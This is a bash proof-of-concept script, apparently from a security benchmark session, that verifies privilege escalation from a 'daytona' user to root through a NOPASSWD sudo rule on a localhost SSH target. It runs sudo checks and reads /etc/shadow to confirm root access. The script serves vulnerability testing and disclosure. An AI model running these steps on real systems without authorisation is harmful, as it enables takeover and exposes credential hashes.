#!/bin/bash
# POC: Demonstrates privilege escalation from daytona user to root via NOPASSWD sudo configuration
# Target: ./repo
# Created: 2025-11-07T18:29:00.111Z
# Session: benchmark-XBEN-097-24-mhp6l4fm

# Privilege Escalation via NOPASSWD Sudo Configuration POC
# This script demonstrates escalation from daytona user to root

set -e

# Configuration
SSH_KEY_PATH="/tmp/ssh_test/test_key"
SSH_HOST="localhost"
SSH_PORT="22220"
SSH_USER="test"

echo "[*] Testing Privilege Escalation via NOPASSWD Sudo"
echo "[*] ================================================"

# Check if SSH key exists
if [ ! -f "$SSH_KEY_PATH" ]; then
    echo "[-] Error: SSH key not found at $SSH_KEY_PATH"
    exit 1
fi

echo "[+] SSH key found at $SSH_KEY_PATH"
echo ""

# Step 1: Verify we can connect as daytona user
echo "[*] Step 1: Verifying SSH connection as daytona user..."
WHOAMI_OUTPUT=$(ssh -i "$SSH_KEY_PATH" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$SSH_USER@$SSH_HOST" -p "$SSH_PORT" 'whoami' 2>/dev/null)
echo "[+] Current user: $WHOAMI_OUTPUT"

if [ "$WHOAMI_OUTPUT" != "daytona" ]; then
    echo "[-] Error: Not connected as daytona user"
    exit 1
fi

echo ""

# Step 2: Check sudo privileges
echo "[*] Step 2: Checking sudo privileges..."
SUDO_PRIVILEGES=$(ssh -i "$SSH_KEY_PATH" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$SSH_USER@$SSH_HOST" -p "$SSH_PORT" 'sudo -l 2>&1' 2>/dev/null)
echo "[+] Sudo privileges output:"
echo "$SUDO_PRIVILEGES"

# Verify NOPASSWD privilege
if echo "$SUDO_PRIVILEGES" | grep -q "NOPASSWD"; then
    echo "[+] VULNERABLE: NOPASSWD privileges detected!"
else
    echo "[-] NOPASSWD privileges not detected"
    exit 1
fi

echo ""

# Step 3: Test privilege escalation - execute whoami as root
echo "[*] Step 3: Testing privilege escalation to root..."
ROOT_CHECK=$(ssh -i "$SSH_KEY_PATH" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$SSH_USER@$SSH_HOST" -p "$SSH_PORT" 'sudo whoami' 2>/dev/null)
echo "[+] Running 'sudo whoami': $ROOT_CHECK"

if [ "$ROOT_CHECK" = "root" ]; then
    echo "[+] SUCCESSFULLY ESCALATED TO ROOT!"
else
    echo "[-] Failed to escalate to root"
    exit 1
fi

echo ""

# Step 4: Verify root access by reading /etc/shadow (requires root)
echo "[*] Step 4: Attempting to read /etc/shadow (root-only file)..."
SHADOW_OUTPUT=$(ssh -i "$SSH_KEY_PATH" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$SSH_USER@$SSH_HOST" -p "$SSH_PORT" 'sudo head -1 /etc/shadow' 2>/dev/null)

if [ ! -z "$SHADOW_OUTPUT" ]; then
    echo "[+] Successfully read /etc/shadow (first line):"
    echo "    $SHADOW_OUTPUT"
    echo "[+] CRITICAL: Full system compromise confirmed - root access achieved!"
else
    echo "[!] Could not read /etc/shadow"
fi

echo ""

# Step 5: Demonstrate arbitrary command execution as root
echo "[*] Step 5: Testing arbitrary command execution as root..."
ARBITRARY_CMD=$(ssh -i "$SSH_KEY_PATH" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$SSH_USER@$SSH_HOST" -p "$SSH_PORT" 'sudo id' 2>/dev/null)
echo "[+] Running 'sudo id': $ARBITRARY_CMD"

if echo "$ARBITRARY_CMD" | grep -q "uid=0"; then
    echo "[+] CONFIRMED: Arbitrary commands executed with uid=0 (root)"
else
    echo "[-] Could not verify arbitrary command execution"
    exit 1
fi

echo ""
echo "[*] ================================================"
echo "[+] VULNERABILITY CONFIRMED!"
echo "[+] Full privilege escalation from daytona to root achieved"
echo "[+] Impact: Complete system compromise possible"
echo "[+] Attacker can execute ANY command as root without password"